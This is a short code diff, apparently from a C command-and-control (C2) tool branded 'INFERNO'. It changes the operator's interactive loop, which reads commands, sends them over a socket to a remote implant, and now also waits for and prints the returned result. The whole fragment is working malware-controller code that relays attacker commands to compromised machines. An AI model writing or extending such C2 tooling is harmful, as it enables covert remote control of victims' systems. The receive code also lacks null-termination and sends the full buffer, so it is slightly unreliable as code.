@@ -87,23 +87,29 @@ void networking() {
 
     while (1) {
 
-    static char instruction[1024];
-    printf("%s\n\n", instruction);
-    printf("[ASX]@[INFERNO]> ");
+        static char instruction[1024];
+        printf("\n[ASX]@[INFERNO]> ");
 
-    if (fgets(instruction, sizeof(instruction), stdin) == NULL){
-        perror("fgets failed");
-        exit(EXIT_FAILURE);
-    }
+        if (fgets(instruction, sizeof(instruction), stdin) == NULL){
+            perror("fgets failed");
+            exit(EXIT_FAILURE);
+        }
 
-    instruction[strcspn(instruction, "\n")] = '\0';
+        instruction[strcspn(instruction, "\n")] = '\0';
     
-    if (strcmp(instruction, "exit") == 0) {
-         puts("\nClosing c2 and exiting...");
-         exit(EXIT_SUCCESS);
-    }
+        if (strcmp(instruction, "exit") == 0) {
+            puts("\nClosing c2 and exiting...");
+            exit(EXIT_SUCCESS);
+        }
 
-    //sending
-    ssize_t inferno_send = send(inferno_socket, instruction, sizeof(instruction), 0);
+        //sending
+        ssize_t inferno_send = send(inferno_socket, instruction, sizeof(instruction), 0);
+
+        // wait for response
+        char receive[1024];
+        printf("Waiting for response...\n");
+        int inferno_receive = recv(inferno_socket, receive, sizeof(receive), 0);
+        receive[strcspn(receive, "\n")] = '\0';
+        printf("Result: %s\n", receive);
     }
 }
